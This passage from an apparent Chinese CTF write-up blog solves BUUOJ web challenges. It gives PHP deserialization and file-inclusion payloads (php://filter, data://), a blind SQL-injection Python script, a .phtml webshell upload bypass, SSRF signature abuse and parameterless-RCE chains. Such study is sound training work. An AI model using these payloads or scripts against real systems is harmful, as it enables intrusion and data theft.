class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>是一道简单的php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$c = <span class="keyword">new</span> HelloPhp; </span><br><span class="line">$c-&gt;a=<span class="string">'phpinfo()'</span>;</span><br><span class="line">$c-&gt;b=<span class="string">'assert'</span>;<span class="comment">//assert是尝试了别的执行函数后发现的</span></span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"><span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure><p>把序列化数据传给data，在phpinfo页面找到flag，或者网页源码处也可以</p><img src="/2020/05/16/buuoj3/11.png" class=""><h4 id="0X08：-BSidesCF-2020-Had-a-bad-day"><a href="#0X08：-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0X08：[BSidesCF 2020]Had a bad day"></a>0X08：[BSidesCF 2020]Had a bad day</h4><p>打开题目，有按钮，随便点一个url出来的形式应该是sql或者文件包含，尝试包含index.php</p><img src="/2020/05/16/buuoj3/12.png" class=""><p>出错了，去掉了.php后缀成功包含，base64解码，贴一下主要的php部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可见要想包含成功,category参数值中要有woofers，meowers或者index，只需要用伪协议套一层协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;40a3219f-a796-4a79-9c4f-0dcd86f4e96a.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/13.png" class=""><p>base64解码就能够看到flag了</p><h4 id="0X09：-WUSTCTF2020-颜值成绩查询"><a href="#0X09：-WUSTCTF2020-颜值成绩查询" class="headerlink" title="0X09：[WUSTCTF2020]颜值成绩查询"></a>0X09：[WUSTCTF2020]颜值成绩查询</h4><p>盲注，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7e100a65-2a28-4468-bd32-37a4f7d7bf17.node3.buuoj.cn/?stunum=1"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        payload = <span class="string">"^(ascii(substr((select(value)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">'too fast'</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hi admin, your score is: 100'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'Hi admin, your score is: 100'</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br></pre></td></tr></table></figure><p>不知道什么原因，每次出来的flag都不一样，先放着了，思路没问题，用异或注入</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj2</title>
      <link href="/2020/05/11/buuoj2/"/>
      <url>/2020/05/11/buuoj2/</url>
      
        <content type="html"><![CDATA[<h4 id="0X01-ZJCTF-2019-NiZhuanSiWei"><a href="#0X01-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0X01:[ZJCTF 2019]NiZhuanSiWei"></a>0X01:[ZJCTF 2019]NiZhuanSiWei<a id="more"></a></h4><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pass1:</p><p>用data协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/1.png" class=""><p>pass2：</p><p>用filter协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>拿到base64加密的源码，解密，是个简单的序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//让file=flag.php即可</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/2.png" class=""><h4 id="0X02-ACTF2020-新生赛-Include"><a href="#0X02-ACTF2020-新生赛-Include" class="headerlink" title="0X02:[ACTF2020 新生赛]Include"></a>0X02:[ACTF2020 新生赛]Include</h4><p>打开题目，有一个跳转链接，点击</p><img src="/2020/05/11/buuoj2/4.png" class=""><p>直接用filter读取flag.php</p><img src="/2020/05/11/buuoj2/3.png" class=""><p>base64解密就能拿到flag</p><h4 id="0X03-ACTF2020-新生赛-Upload"><a href="#0X03-ACTF2020-新生赛-Upload" class="headerlink" title="0X03:[ACTF2020 新生赛]Upload"></a>0X03:[ACTF2020 新生赛]Upload</h4><p>查看网页源码，有js前端验证，直接去掉</p><p>上传一个php文件，提示只能上传图片文件</p><p>尝试后缀绕过，phtml成功上传，连上蚁剑，拿到flag</p><img src="/2020/05/11/buuoj2/5.png" class=""><p>从拿到的源码可以看到考点就是phtml</p><h4 id="0X04-De1CTF-2019-SSRF-Me"><a href="#0X04-De1CTF-2019-SSRF-Me" class="headerlink" title="0X04:[De1CTF 2019]SSRF Me"></a>0X04:[De1CTF 2019]SSRF Me</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在/De1ta页面我们get方法传入param参数值，在cookie里面传递action和sign的值,将传递的param通过waf这个函数,waf函数过滤了以file和gopher开头的，传参构造Task类，调用exec方法，checkSign验证登录</p><img src="/2020/05/11/buuoj2/6.png" class=""><p>上面的分析可以知道，action=readscan或者scanread</p><img src="/2020/05/11/buuoj2/8.png" class="" title="e"><p>当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true</p><p>返回true之后则进入if语句里面</p><img src="/2020/05/11/buuoj2/7.png" class=""><p>需要secert_key+param+action三个字符串连接起来之后进行md5加密作为返回值</p><p>调用geneSign路由可以拿到secret_key，再给param传值，param=flag.txtread,得到需要的MD5值</p><img src="/2020/05/11/buuoj2/10.png" class=""><h4 id="0X05-ASIS-2019-Unicorn-shop"><a href="#0X05-ASIS-2019-Unicorn-shop" class="headerlink" title="0X05:[ASIS 2019]Unicorn shop"></a>0X05:[ASIS 2019]Unicorn shop</h4><p>打开是一个购买界面，有四种商品，随便选一个，输入价格</p><img src="/2020/05/11/buuoj2/12.png" class=""><p>只能输入一个字符，看一下源码，找到了点提示</p><img src="/2020/05/11/buuoj2/11.png" class=""><p>用utf-8的编码来购买，价格要大于4号商品的价格，找了一个网站，这里记录一下</p><p><a href="https://www.compart.com/en/unicode/U+2187" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2187</a></p><p>搜索一下thousand，找一个字符，修改0x为%即可</p><img src="/2020/05/11/buuoj2/13.png" class="" title="examplename"><h4 id="0X06-GXYCTF2019-禁止套娃"><a href="#0X06-GXYCTF2019-禁止套娃" class="headerlink" title="0X06:[GXYCTF2019]禁止套娃"></a>0X06:[GXYCTF2019]禁止套娃</h4><p>打开题目没什么提示，扫描一发</p><img src="/2020/05/11/buuoj2/14.png" class=""><p>发现了.git泄露，git攻击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多东西，看了别的师傅的wp，说是无参RCE，学习一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/15.png" class=""><h4 id="0X07-SUCTF-2019-Pythonginx"><a href="#0X07-SUCTF-2019-Pythonginx" class="headerlink" title="0X07:[SUCTF 2019]Pythonginx"></a>0X07:[SUCTF 2019]Pythonginx</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span 